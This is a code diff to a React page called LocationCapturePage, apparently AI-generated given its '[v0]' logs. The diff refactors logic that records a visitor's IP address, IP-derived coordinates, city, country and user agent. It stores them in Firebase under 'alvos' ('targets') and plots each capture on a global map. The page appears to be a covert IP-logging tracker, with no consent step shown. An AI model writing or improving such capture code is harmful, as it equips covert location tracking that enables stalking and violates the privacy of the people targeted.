@@ -122,9 +122,8 @@ export default function LocationCapturePage() {
         location: data.ipData ? `${data.ipData.city}, ${data.ipData.country}` : "MISSING",
       })
 
-      if (!data.ipData || !data.ipData.latitude || !data.ipData.longitude) {
-        console.error("[v0] ❌ CRITICAL: Cannot save capture without valid IP coordinates!")
-        console.error("[v0] 📍 IP Data received:", JSON.stringify(data.ipData, null, 2))
+      if (!data.ipData?.latitude || !data.ipData?.longitude) {
+        console.error("Cannot save: missing coordinates")
         setHasCaptured(true)
         setIsCapturing(false)
         return
@@ -132,12 +131,11 @@ export default function LocationCapturePage() {
 
       const userPath = userId || "anonymous"
       const alvosRef = ref(database, `alvos/${userPath}`)
-      const timestamp = Date.now()
 
       const capturePayload = {
         pageType: "location",
         pageName: "Mapa de Localização",
-        timestamp,
+        timestamp: Date.now(),
         ipAddress: data.ipData.ip || "Unknown",
         userAgent: navigator.userAgent,
         ipData: {
@@ -162,7 +160,7 @@ export default function LocationCapturePage() {
       console.log("[v0] 📂 Firebase path:", `alvos/${userPath}`)
       console.log("[v0] 📦 Payload structure:", {
         pageType: capturePayload.pageType,
-        timestamp: new Date(timestamp).toISOString(),
+        timestamp: new Date(capturePayload.timestamp).toISOString(),
         hasIpData: !!capturePayload.ipData,
         coordinates: {
           lat: capturePayload.ipData.latitude,
@@ -183,7 +181,7 @@ export default function LocationCapturePage() {
         longitude: capturePayload.ipData.longitude,
         location: `${capturePayload.ipData.city}, ${capturePayload.ipData.country}`,
       })
-      console.log("[v0] ⏰ Timestamp:", new Date(timestamp).toISOString())
+      console.log("[v0] ⏰ Timestamp:", new Date(capturePayload.timestamp).toISOString())
       console.log("[v0] 🎯 This capture should now appear on the global map immediately!")
 
       setHasCaptured(true)
